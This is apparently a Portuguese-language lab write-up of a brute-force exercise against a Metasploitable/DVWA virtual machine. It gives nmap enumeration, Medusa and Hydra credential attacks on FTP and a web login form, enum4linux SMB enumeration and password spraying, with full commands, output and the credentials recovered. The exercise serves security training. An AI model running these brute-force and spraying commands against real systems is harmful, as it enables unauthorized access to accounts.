# brute-force
medusa - brute force = 
Voltada para ataque de rede com foco altíssima velocidade e estabilidade.


<img width="370" height="25" alt="image" src="https://github.com/user-attachments/assets/9ab74f77-5500-4c54-be21-44e8526d3580" />
deixando ela em atividade .. 
##Pinga pra saber se esta na mesma rede , a maquina que deseja invadir precisa esta na mesma rede>

ping -c 3 192.168.56.3 *mandando somente 3 pacotes para o numero de deseja conexao*
┌──(kali㉿kali)-[~]
└─$ ping -c 3  192.168.56.3
PING 192.168.56.3 (192.168.56.3) 56(84) bytes of data.
64 bytes from 192.168.56.3: icmp_seq=1 ttl=64 time=0.336 ms
64 bytes from 192.168.56.3: icmp_seq=2 ttl=64 time=0.579 ms
64 bytes from 192.168.56.3: icmp_seq=3 ttl=64 time=0.738 ms

--- 192.168.56.3 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2050ms
rtt min/avg/max/mdev = 0.336/0.551/0.738/0.165 ms


##Auditoria foco ftp> **
1p - enumeraçao *desconbrir quais os serviços estao disponivel no sistema alvo* - nmap

comando no terminal> 
nmap -sV -p 21,22,80,445,139 192.168.56.3  
* scan da -sV eh a versao de serviso, -p e a seguencia de numeros são as portas principais, e por ultimo p ip alvo*

──(kali㉿kali)-[~]
└─$ nmap -sV -p 21,22,80,445,139 192.168.56.3
Starting Nmap 7.92 ( https://nmap.org ) at 2025-10-28 15:32 EDT
Nmap scan report for 192.168.56.3
Host is up (0.0016s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.70 seconds

confirmando a porta do ftp aberta...

##criando possivel lista de usuario e senhas comuns >**

comando no terminal>
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt

kali㉿kali)-[~]
└─$ echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt    
                                                                             
┌──(kali㉿kali)-[~]
└─$ echo -e "user\nmsfadmin\nadmin\nroot" > users.txt


criando as listas...

## força bruta ** 
comando terminal>
medusa -h 192.168.56.3 -U users.txt -P pass.txt -M ftp -t 6


┌──(kali㉿kali)-[~]
└─$ medusa -h 192.168.56.3 -U users.txt -P pass.txt -M ftp -t 6
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: 123456 (1 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: password (2 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: qwerty (3 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: user (1 of 4, 1 complete) Password: msfadmin (4 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: 123456 (1 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: password (2 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: msfadmin (2 of 4, 2 complete) Password: msfadmin (3 of 4 complete)
ACCOUNT FOUND: [ftp] Host: 192.168.56.3 User: msfadmin Password: msfadmin [SUCCESS]
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: admin (3 of 4, 3 complete) Password: 123456 (1 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: root (4 of 4, 3 complete) Password: 123456 (1 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: msfadmin (2 of 4, 3 complete) Password: qwerty (4 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: root (4 of 4, 3 complete) Password: password (2 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: password (2 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: qwerty (3 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: admin (3 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: qwerty (3 of 4 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.3 (1 of 1, 0 complete) User: root (4 of 4, 5 complete) Password: msfadmin (4 of 4 complete)
                                                                                                                                                                       




aparecerar se encontrou ou não.. Se encontrou aparece com sucesso>

##aceder**
comando no terminal>
ftp 192.168.56.3
name> msfadmin
pass> msfadmin

┌──(kali㉿kali)-[~]
└─$ ftp 192.168.56.3
Connected to 192.168.56.3.
220 (vsFTPd 2.3.4)
Name (192.168.56.3:kali): msfadmin     
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

ataque final;

<img width="317" height="287" alt="image" src="https://github.com/user-attachments/assets/21ff371b-92ba-4920-9974-e2d2d74bae3e" />
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

## Formulario web
 no navegador > 192.168.56.3/dvwa/login.php
 
simular o login para ver como responde, e ativar o modo desenvolvedor da pagina f12
<img width="1366" height="662" alt="kali" src="https://github.com/user-attachments/assets/8845f9ee-969d-4d1c-b7be-081c3ac5a076" />

comando no terminal:>

hydra -L users.txt -P pass.txt 192.168.56.3 http-form-post \
"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -t 16

Hydra é amplamente usado para http-form-post e geralmente lida melhor com esse cenário. Exemplo (ajusta FAIL_STRING conforme a página real). A parte depois de http-form-post tem a sintaxe: path:POST_data:failure_string.

┌──(kali㉿kali)-[~]
└─$ hydra -L users.txt -P pass.txt 192.168.56.3 http-form-post \
"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -t 16
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-28 16:16:07
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
[DATA] attacking http-post-form://192.168.56.3:80/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed
[80][http-post-form] host: 192.168.56.3   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-28 16:16:10


se tiver sucess foi... ex [80][http-post-form] host: 192.168.56.3   login: admin   password: password
no navegador= 

colocar o use e pss que apareceu> 
<img width="1366" height="662" alt="fim" src="https://github.com/user-attachments/assets/43f4c4d4-872d-4d9f-99f3-1b848319daf2" />



##fim





##Ataque em cadeia, enumeraçao smb +password spraying *sistema microsoft * samba##


comando terminal> 
Enum4linux -a 192.168.56.3 | tee enum4_output.txt
*-a ativa toda tecnica possivel de enumeraçao,+o ip alvo+ | tee e um nome.txt seve para grava os comando no arquuivos
 
abrir o que foi gerado terminal >
less enum4_output.txt


no qual irar aparecer > 

Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Oct 28 11:21:27 2025

[34m =========================================( [0m[32mTarget Information[0m[34m )=========================================

[0mTarget ........... 192.168.56.3
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


[34m ============================( [0m[32mEnumerating Workgroup/Domain on 192.168.56.3[0m[34m )============================

[0m[33m
[+] [0m[32mGot domain/workgroup name: WORKGROUP

[0m
[34m ================================( [0m[32mNbtstat Information for 192.168.56.3[0m[34m )================================

[0mLooking up status of 192.168.56.3
	METASPLOITABLE  <00> -         B <ACTIVE>  Workstation Service
	METASPLOITABLE  <03> -         B <ACTIVE>  Messenger Service
	METASPLOITABLE  <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

[34m ===================================( [0m[32mSession Check on 192.168.56.3[0m[34m )===================================

[0m[33m
[+] [0m[32mServer 192.168.56.3 allows sessions using username '', password ''

[0m
[34m ================================( [0m[32mGetting domain SID for 192.168.56.3[0m[34m )================================

[0mDomain Name: WORKGROUP
Domain Sid: (NULL SID)
[33m
[+] [0m[32mCan't determine if host is part of domain or part of a workgroup

[0m
[34m ===================================( [0m[32mOS information on 192.168.56.3[0m[34m )===================================

[0m[33m
[E] [0m[31mCan't get OS info with smbclient

[0m[33m
[+] [0m[32mGot OS info for 192.168.56.3 from srvinfo: 
[0m	METASPLOITABLE Wk Sv PrQ Unx NT SNT metasploitable server (Samba 3.0.20-Debian)
	platform_id     :	500
	os version      :	4.9
	server type     :	0x9a03


[34m =======================================( [0m[32mUsers on 192.168.56.3[0m[34m )=======================================

[0mindex: 0x1 RID: 0x3f2 acb: 0x00000011 Account: games	Name: games	Desc: (null)
index: 0x2 RID: 0x1f5 acb: 0x00000011 Account: nobody	Name: nobody	Desc: (null)
index: 0x3 RID: 0x4ba acb: 0x00000011 Account: bind	Name: (null)	Desc: (null)
index: 0x4 RID: 0x402 acb: 0x00000011 Account: proxy	Name: proxy	Desc: (null)
index: 0x5 RID: 0x4b4 acb: 0x00000011 Account: syslog	Name: (null)	Desc: (null)
index: 0x6 RID: 0xbba acb: 0x00000010 Account: user	Name: just a user,111,,	Desc: (null)
index: 0x7 RID: 0x42a acb: 0x00000011 Account: www-data	Name: www-data	Desc: (null)
index: 0x8 RID: 0x3e8 acb: 0x00000011 Account: root	Name: root	Desc: (null)
index: 0x9 RID: 0x3fa acb: 0x00000011 Account: news	Name: news	Desc: (null)
index: 0xa RID: 0x4c0 acb: 0x00000011 Account: postgres	Name: PostgreSQL administrator,,,	Desc: (null)
index: 0xb RID: 0x3ec acb: 0x00000011 Account: bin	Name: bin	Desc: (null)
index: 0xc RID: 0x3f8 acb: 0x00000011 Account: mail	Name: mail	Desc: (null)
index: 0xd RID: 0x4c6 acb: 0x00000011 Account: distccd	Name: (null)	Desc: (null)
index: 0xe RID: 0x4ca acb: 0x00000011 Account: proftpd	Name: (null)	Desc: (null)
index: 0xf RID: 0x4b2 acb: 0x00000011 Account: dhcp	Name: (null)	Desc: (null)
index: 0x10 RID: 0x3ea acb: 0x00000011 Account: daemon	Name: daemon	Desc: (null)
index: 0x11 RID: 0x4b8 acb: 0x00000011 Account: sshd	Name: (null)	Desc: (null)
index: 0x12 RID: 0x3f4 acb: 0x00000011 Account: man	Name: man	Desc: (null)
index: 0x13 RID: 0x3f6 acb: 0x00000011 Account: lp	Name: lp	Desc: (null)
index: 0x14 RID: 0x4c2 acb: 0x00000011 Account: mysql	Name: MySQL Server,,,	Desc: (null)
index: 0x15 RID: 0x43a acb: 0x00000011 Account: gnats	Name: Gnats Bug-Reporting System (admin)	Desc: (null)
index: 0x16 RID: 0x4b0 acb: 0x00000011 Account: libuuid	Name: (null)	Desc: (null)
index: 0x17 RID: 0x42c acb: 0x00000011 Account: backup	Name: backup	Desc: (null)
index: 0x18 RID: 0xbb8 acb: 0x00000010 Account: msfadmin	Name: msfadmin,,,	Desc: (null)
index: 0x19 RID: 0x4c8 acb: 0x00000011 Account: telnetd	Name: (null)	Desc: (null)
index: 0x1a RID: 0x3ee acb: 0x00000011 Account: sys	Name: sys	Desc: (null)
index: 0x1b RID: 0x4b6 acb: 0x00000011 Account: klog	Name: (null)	Desc: (null)
index: 0x1c RID: 0x4bc acb: 0x00000011 Account: postfix	Name: (null)	Desc: (null)
index: 0x1d RID: 0xbbc acb: 0x00000011 Account: service	Name: ,,,	Desc: (null)
index: 0x1e RID: 0x434 acb: 0x00000011 Account: list	Name: Mailing List Manager	Desc: (null)
index: 0x1f RID: 0x436 acb: 0x00000011 Account: irc	Name: ircd	Desc: (null)
index: 0x20 RID: 0x4be acb: 0x00000011 Account: ftp	Name: (null)	Desc: (null)
index: 0x21 RID: 0x4c4 acb: 0x00000011 Account: tomcat55	Name: (null)	Desc: (null)
index: 0x22 RID: 0x3f0 acb: 0x00000011 Account: sync	Name: sync	Desc: (null)
index: 0x23 RID: 0x3fc acb: 0x00000011 Account: uucp	Name: uucp	Desc: (null)

user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[bind] rid:[0x4ba]
user:[proxy] rid:[0x402]
user:[syslog] rid:[0x4b4]
user:[user] rid:[0xbba]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[postgres] rid:[0x4c0]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[distccd] rid:[0x4c6]
user:[proftpd] rid:[0x4ca]
user:[dhcp] rid:[0x4b2]
user:[daemon] rid:[0x3ea]
user:[sshd] rid:[0x4b8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[mysql] rid:[0x4c2]
user:[gnats] rid:[0x43a]
user:[libuuid] rid:[0x4b0]
user:[backup] rid:[0x42c]
user:[msfadmin] rid:[0xbb8]
user:[telnetd] rid:[0x4c8]
user:[sys] rid:[0x3ee]
user:[klog] rid:[0x4b6]
user:[postfix] rid:[0x4bc]
user:[service] rid:[0xbbc]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[ftp] rid:[0x4be]
user:[tomcat55] rid:[0x4c4]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]

[34m =================================( [0m[32mShare Enumeration on 192.168.56.3[0m[34m )=================================

[0m
	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            METASPLOITABLE
[33m
[+] [0m[32mAttempting to map shares on 192.168.56.3

[0m//192.168.56.3/print$	[35mMapping: [0mDENIED[35m Listing: [0mN/A[35m Writing: [0mN/A
//192.168.56.3/tmp	[35mMapping: [0mOK[35m Listing: [0mOK[35m Writing: [0mN/A
//192.168.56.3/opt	[35mMapping: [0mDENIED[35m Listing: [0mN/A[35m Writing: [0mN/A
[33m
[E] [0m[31mCan't understand response:

[0mNT_STATUS_NETWORK_ACCESS_DENIED listing \*
//192.168.56.3/IPC$	[35mMapping: [0mN/A[35m Listing: [0mN/A[35m Writing: [0mN/A
//192.168.56.3/ADMIN$	[35mMapping: [0mDENIED[35m Listing: [0mN/A[35m Writing: [0mN/A

[34m ============================( [0m[32mPassword Policy Information for 192.168.56.3[0m[34m )============================

[0m

[+] Attaching to 192.168.56.3 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] METASPLOITABLE
	[+] Builtin

[+] Password Info for Domain: METASPLOITABLE

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: Not Set
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: Not Set


[33m
[+] [0m[32mRetieved partial password policy with rpcclient:


[0mPassword Complexity: Disabled
Minimum Password Length: 0


[34m =======================================( [0m[32mGroups on 192.168.56.3[0m[34m )=======================================

[0m[33m
[+] [0m[32mGetting builtin groups:

[0m[33m
[+] [0m[32m Getting builtin group memberships:

[0m[33m
[+] [0m[32m Getting local groups:

[0m[33m
[+] [0m[32m Getting local group memberships:

[0m[33m
[+] [0m[32m Getting domain groups:

[0m[33m
[+] [0m[32m Getting domain group memberships:

[0m
[34m ==================( [0m[32mUsers on 192.168.56.3 via RID cycling (RIDS: 500-550,1000-1050)[0m[34m )==================

[0m[33m
[I] [0m[36mFound new SID: 
[0mS-1-5-21-1042354039-2475377354-766472396
[33m
[+] [0m[32mEnumerating users using SID S-1-5-21-1042354039-2475377354-766472396 and logon username '', password ''

[0mS-1-5-21-1042354039-2475377354-766472396-500 METASPLOITABLE\Administrator (Local User)
S-1-5-21-1042354039-2475377354-766472396-501 METASPLOITABLE\nobody (Local User)
S-1-5-21-1042354039-2475377354-766472396-512 METASPLOITABLE\Domain Admins (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-513 METASPLOITABLE\Domain Users (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-514 METASPLOITABLE\Domain Guests (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1000 METASPLOITABLE\root (Local User)
S-1-5-21-1042354039-2475377354-766472396-1001 METASPLOITABLE\root (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1002 METASPLOITABLE\daemon (Local User)
S-1-5-21-1042354039-2475377354-766472396-1003 METASPLOITABLE\daemon (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1004 METASPLOITABLE\bin (Local User)
S-1-5-21-1042354039-2475377354-766472396-1005 METASPLOITABLE\bin (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1006 METASPLOITABLE\sys (Local User)
S-1-5-21-1042354039-2475377354-766472396-1007 METASPLOITABLE\sys (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1008 METASPLOITABLE\sync (Local User)
S-1-5-21-1042354039-2475377354-766472396-1009 METASPLOITABLE\adm (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1010 METASPLOITABLE\games (Local User)
S-1-5-21-1042354039-2475377354-766472396-1011 METASPLOITABLE\tty (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1012 METASPLOITABLE\man (Local User)
S-1-5-21-1042354039-2475377354-766472396-1013 METASPLOITABLE\disk (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1014 METASPLOITABLE\lp (Local User)
S-1-5-21-1042354039-2475377354-766472396-1015 METASPLOITABLE\lp (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1016 METASPLOITABLE\mail (Local User)
S-1-5-21-1042354039-2475377354-766472396-1017 METASPLOITABLE\mail (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1018 METASPLOITABLE\news (Local User)
S-1-5-21-1042354039-2475377354-766472396-1019 METASPLOITABLE\news (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1020 METASPLOITABLE\uucp (Local User)
S-1-5-21-1042354039-2475377354-766472396-1021 METASPLOITABLE\uucp (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1025 METASPLOITABLE\man (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1026 METASPLOITABLE\proxy (Local User)
S-1-5-21-1042354039-2475377354-766472396-1027 METASPLOITABLE\proxy (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1031 METASPLOITABLE\kmem (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1041 METASPLOITABLE\dialout (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1043 METASPLOITABLE\fax (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1045 METASPLOITABLE\voice (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1049 METASPLOITABLE\cdrom (Domain Group)

[34m ===============================( [0m[32mGetting printer info for 192.168.56.3[0m[34m )===============================

[0mNo printers returned.


enum4linux complete on Tue Oct 28 11:21:43 2025



:::::::::::::::::::::::::::::::::::::::::::


dentro desse enumeraçao encontra-se varios user> 

criando lista de user e pass: com 1 comando
echo -e 'user\nmsfadmin\nservice' > snb_users.txt
echo -e 'password\n123456\nWelcome123\nmsfsadmin' > senha_spray.txt

linha de comando> 
medusa -h 192.168.56.3 -U snb_users.txt -p senha_spray.txt -M smbnt -t 2 -T 50

-t testar 2 user testando senha
-T ate 50 hosts pararelo




testando no terminal os acesso>
smbclient -L //192.168.56.3 -U msfadmin


──(kali㉿kali)-[~]
└─$ smbclient -L //192.168.56.3 -U msfadmin
Password for [WORKGROUP\msfadmin]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        msfadmin        Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            METASPLOITABLE
                                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ 
